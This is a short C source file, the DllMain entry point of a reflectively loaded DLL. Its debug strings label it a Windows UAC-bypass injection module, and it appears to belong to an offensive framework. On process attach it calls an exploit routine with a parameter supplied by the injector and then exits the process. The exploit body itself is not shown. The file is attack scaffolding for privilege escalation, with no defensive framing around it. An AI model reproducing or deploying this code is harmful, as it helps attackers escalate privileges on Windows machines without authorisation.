#include "ReflectiveLoader.h"
#include "Exploit.h"

extern HINSTANCE hAppInstance;

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;

	dprintf("[BYPASSUAC_INJECTION] DllMain entered");
	switch( dwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			if (lpReserved != NULL) {
				dprintf("[BYPASSUAC_INJECTION] Launching exploit with %p", lpReserved);
				exploit(lpReserved);
			}
			dprintf("[BYPASSUAC_INJECTION] Finished, exiting process...");
			ExitProcess(0);
			break;
		case DLL_QUERY_HMODULE:
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}
